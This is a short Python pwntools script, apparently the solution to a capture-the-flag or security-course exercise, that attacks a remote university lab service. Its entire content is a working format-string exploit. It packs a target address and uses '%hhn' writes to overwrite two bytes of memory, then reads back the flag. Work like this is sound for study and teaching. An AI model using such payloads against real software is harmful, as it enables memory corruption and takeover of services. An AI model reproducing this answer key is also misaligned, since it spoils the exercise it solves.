from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23197

remote = remote(SERVER, PORT, timeout=10000)

target_address = 0x804c018

buffer = p32(target_address + 1) + p32(target_address) + \
         b"%138x" + b"%7$hhn" + b"%132x" + b"%8$hhn"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof")
print(flag.decode())